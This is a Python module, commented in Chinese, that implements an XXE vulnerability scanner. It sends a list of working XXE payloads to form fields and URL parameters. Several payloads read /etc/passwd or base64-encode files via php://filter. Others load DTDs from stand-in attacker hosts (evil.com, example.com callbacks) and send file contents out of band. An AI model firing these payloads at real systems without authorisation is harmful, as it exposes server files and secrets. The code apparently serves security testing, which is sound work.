#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
XXE（XML外部实体注入）扫描器模块，负责扫描XXE漏洞
"""

import re
import logging
import random
import string
import time
import uuid
import base64
from urllib.parse import urlparse, urlencode, parse_qsl, unquote

logger = logging.getLogger('xss_scanner')

class XXEScanner:
    """XXE扫描器类，负责扫描XML外部实体注入漏洞"""
    
    def __init__(self, http_client):
        """
        初始化XXE扫描器
        
        Args:
            http_client: HTTP客户端对象
        """
        self.http_client = http_client
        
        # 生成唯一标识符，用于检测XXE漏洞
        self.xxe_id = str(uuid.uuid4()).replace('-', '')[:16]
        
        # XXE回调域名
        # 注意：在实际使用中，应该使用攻击者控制的服务器
        self.callback_domain = f"http://xxe-check.example.com/{self.xxe_id}"
        self.dtd_server = f"http://dtd-server.example.com/{self.xxe_id}.dtd"
        
        # XXE检测Payload
        self.payloads = [
            # 基本外部实体声明
            f"""<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
            <foo>&xxe;</foo>""",
            
            # 参数实体
            f"""<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ENTITY % xxe SYSTEM "file:///etc/passwd" >
            %xxe;
            ]>
            <foo>Placeholder</foo>""",
            
            # 使用PHP封装器进行Base64编码
            f"""<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd" >]>
            <foo>&xxe;</foo>""",
            
            # 使用外部DTD
            f"""<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo SYSTEM "{self.dtd_server}">
            <foo>Placeholder</foo>""",
            
            # 使用参数实体引用外部DTD
            f"""<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ENTITY % xxe SYSTEM "{self.dtd_server}">
            %xxe;
            ]>
            <foo>Placeholder</foo>""",
            
            # 使用反射式外部实体
            f"""<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ENTITY % file SYSTEM "file:///etc/passwd">
            <!ENTITY % dtd SYSTEM "{self.dtd_server}">
            %dtd;
            ]>
            <foo>Placeholder</foo>""",
            
            # 使用参数实体进行带外数据检索
            f"""<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ENTITY % file SYSTEM "file:///etc/passwd">
            <!ENTITY % all "<!ENTITY send SYSTEM '{self.callback_domain}?data=%file;'>">
            %all;
            ]>
            <foo>&send;</foo>""",
            
            # SOAP请求中的XXE
            f"""<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
            <SOAP-ENV:Envelope
            xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:xsd="http://www.w3.org/2001/XMLSchema">
            <SOAP-ENV:Body>
            <ns1:getResponse xmlns:ns1="urn:example" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <return xsi:type="xsd:string">&xxe;</return>
            </ns1:getResponse>
            </SOAP-ENV:Body>
            </SOAP-ENV:Envelope>""",
            
            # SVG文件中的XXE
            f"""<?xml version="1.0" standalone="yes"?>
            <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
            <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
            <text font-size="16" x="0" y="16">&xxe;</text>
            </svg>""",
            
            # 压缩文件解析中的XXE
            f"""<!DOCTYPE foo [
            <!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">
            %remote;
            ]>
            <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
            <text>&exfil;</text>
            </svg>""",
            
            # XXE in JSON request with Content-Type: application/xml
            f"""<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
            <root>
            <name>&xxe;</name>
            <tel>+001</tel>
            <email>user@example.com</email>
            <password>secret</password>
            </root>""",
            
            # 使用XML参数实体绕过WAF
            f"""<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ENTITY % sp SYSTEM "{self.dtd_server}">
            %sp;
            %param1;
            ]>
            <foo>Placeholder</foo>"""
        ]
        
        # XXE成功特征
        self.success_patterns = [
            # Unix文件特征
            "root:.*:0:0:",
            "bin:.*:1:1:",
            "daemon:.*:2:2:",
            "sys:.*:3:3:",
            "sync:.*:4:65534:",
            "games:.*:5:60:",
            "man:.*:6:12:",
            "lp:.*:7:7:",
            "[A-Za-z0-9_-]+:[^\n]*:[0-9]+:[0-9]+:[^\n]*:[^\n]*:[^\n]+",  # /etc/passwd行匹配
            
            # Windows系统文件特征
            "\\[boot loader\\]",
            "\\[operating systems\\]",
            "\\[fonts\\]",
            "\\[extensions\\]",
            
            # 特定应用程序配置文件
            "DB_CONNECTION=",
            "APP_KEY=",
            "APP_ENV=",
            "APP_DEBUG=",
            
            # Base64编码的文件内容
            "^[A-Za-z0-9+/]{20,}={0,2}$",
            
            # XML解析错误
            "XML syntax error",
            "XML processing error",
            "Undeclared entity",
            "Undeclared general entity",
            
            # Java异常
            "java.io.IOException",
            "java.net.MalformedURLException",
            "java.io.FileNotFoundException",
            
            # PHP异常
            "Warning: simplexml_load_",
            "DOMDocument::load",
            "DOMDocument::loadXML",
            
            # Python异常
            "lxml.etree.XMLSyntaxError",
            "xml.etree.ElementTree",
            
            # .NET异常
            "System.Xml",
            "System.IO.FileNotFoundException",
            
            # 其他错误消息
            "Permission denied",
            "No such file or directory",
            
            # 回调ID
            self.xxe_id
        ]
        
        # 可能处理XML的内容类型
        self.xml_content_types = [
            'application/xml',
            'text/xml',
            'application/soap+xml',
            'application/xhtml+xml',
            'application/rss+xml',
            'application/atom+xml',
            'image/svg+xml',
            'application/mathml+xml',
            'application/vnd.google-earth.kml+xml'
        ]
    
    def scan_form(self, url, form, field):
        """
        扫描表单中的XXE漏洞
        
        Args:
            url: 页面URL
            form: 表单信息
            field: 字段信息
            
        Returns:
            dict: 漏洞信息，如果没有发现漏洞则返回None
        """
        if not field.get('name'):
            return None
            
        # 可能存在XXE的字段名称
        xxe_prone_fields = [
            'xml', 'data', 'input', 'request', 'payload', 'content',
            'body', 'message', 'text', 'document', 'file', 'upload'
        ]
        
        # 如果字段名不包含敏感关键词，则跳过扫描
        field_name_lower = field['name'].lower()
        if not any(keyword in field_name_lower for keyword in xxe_prone_fields):
            return None
            
        logger.debug(f"扫描XXE: {field['name']} @ {url}")
        
        # 获取表单提交URL
        action_url = form['action'] if form['action'] else url
        
        # 获取表单方法
        method = form['method'].upper()
        
        # 检测XXE漏洞
        for payload in self.payloads:
            # 构建表单数据
            form_data = {}
            
            # 填充所有字段
            for f in form.get('fields', []):
                if f.get('name'):
                    # 如果是目标字段，则使用Payload
                    if f['name'] == field['name']:
                        form_data[f['name']] = payload
                    else:
                        # 否则使用默认值
                        form_data[f['name']] = f.get('value', '')
            
            # 发送请求
            try:
                logger.debug(f"测试Payload: {payload[:50]}...")
                
                # 对于XXE，我们尝试以XML内容类型发送请求
                headers = {
                    'Content-Type': 'application/xml'
                }
                
                if method == 'POST':
                    # 对于POST请求，我们尝试直接发送XML内容
                    response = self.http_client.post(action_url, data=payload, headers=headers)
                    
                    # 如果失败，则尝试使用普通表单
                    if not response or response.status_code >= 400:
                        response = self.http_client.post(action_url, data=form_data)
                else:
                    # GET请求，使用普通表单
                    response = self.http_client.get(action_url, params=form_data)
                    
                if not response:
                    continue
                    
                # 检查响应中是否包含成功特征
                if self._check_xxe_success(response.text):
                    return {
                        'type': 'XXE',
                        'url': url,
                        'form_action': action_url,
                        'form_method': method,
                        'parameter': field['name'],
                        'payload': payload,
                        'severity': '高',
                        'description': f"在表单字段'{field['name']}'中发现XML外部实体注入(XXE)漏洞",
                        'details': f"表单提交到{action_url}的{field['name']}字段存在XXE漏洞，可以读取服务器上的敏感文件或进行SSRF攻击",
                        'recommendation': "禁用XML解析器中的外部实体和DTD处理，使用安全的解析配置，过滤用户输入"
                    }
            except Exception as e:
                logger.error(f"扫描XXE时发生错误: {str(e)}")
                
        return None
    
    def scan_parameter(self, url, param):
        """
        扫描URL参数中的XXE漏洞
        
        Args:
            url: 页面URL
            param: 参数名
            
        Returns:
            dict: 漏洞信息，如果没有发现漏洞则返回None
        """
        # 可能存在XXE的参数名称
        xxe_prone_params = [
            'xml', 'data', 'input', 'request', 'payload', 'content',
            'body', 'message', 'text', 'document', 'file', 'upload'
        ]
        
        # 如果参数名不包含敏感关键词，则跳过扫描
        param_lower = param.lower()
        if not any(keyword in param_lower for keyword in xxe_prone_params):
            return None
            
        logger.debug(f"扫描XXE参数: {param} @ {url}")
        
        # 解析URL
        parsed_url = urlparse(url)
        
        # 获取查询参数
        query_params = dict(parse_qsl(parsed_url.query))
        
        # 如果参数不存在，则添加
        if param not in query_params:
            query_params[param] = ""
            
        # 构建基础URL
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        # 检测XXE漏洞
        for payload in self.payloads:
            # 构建注入参数
            inject_params = query_params.copy()
            inject_params[param] = payload
            
            # 构建测试URL
            query_string = urlencode(inject_params)
            test_url = f"{base_url}?{query_string}"
            
            try:
                logger.debug(f"测试Payload: {payload[:50]}...")
                
                # URL参数中的XXE测试
                response = self.http_client.get(test_url)
                
                # 如果GET请求失败或返回错误状态码，尝试POST请求
                if not response or response.status_code >= 400:
                    headers = {
                        'Content-Type': 'application/xml'
                    }
                    response = self.http_client.post(url, data=payload, headers=headers)
                    
                if not response:
                    continue
                    
                # 检查响应中是否包含成功特征
                if self._check_xxe_success(response.text):
                    return {
                        'type': 'XXE',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'severity': '高',
                        'description': f"在URL参数'{param}'中发现XML外部实体注入(XXE)漏洞",
                        'details': f"URL参数{param}存在XXE漏洞，可以读取服务器上的敏感文件或进行SSRF攻击",
                        'recommendation': "禁用XML解析器中的外部实体和DTD处理，使用安全的解析配置，过滤用户输入"
                    }
            except Exception as e:
                logger.error(f"扫描XXE参数时发生错误: {str(e)}")
                
        return None
    
    def _check_xxe_success(self, content):
        """
        检查响应内容中是否包含XXE成功的特征
        
        Args:
            content: 响应内容
            
        Returns:
            bool: 是否包含XXE成功特征
        """
        if not content:
            return False
            
        # 检查成功特征
        for pattern in self.success_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
                
        # 检查Base64编码的内容
        # 尝试从内容中提取看起来像Base64的字符串
        for potential_base64 in re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', content):
            try:
                # 尝试解码
                decoded = base64.b64decode(potential_base64).decode('utf-8', errors='ignore')
                # 检查解码后的内容是否包含敏感信息
                for pattern in self.success_patterns:
                    if re.search(pattern, decoded, re.IGNORECASE):
                        return True
            except:
                pass
                
        return False
    
    def check_callback_server(self):
        """
        检查回调服务器是否收到请求（在实际环境中实现）
        
        Returns:
            bool: 是否收到回调请求
        """
        # 此功能在实际环境中需要实现
        # 这里只是一个占位函数
        return False
    
    def can_scan_form(self):
        """是否可以扫描表单"""
        return True
    
    def can_scan_params(self):
        """是否可以扫描URL参数"""
        return True 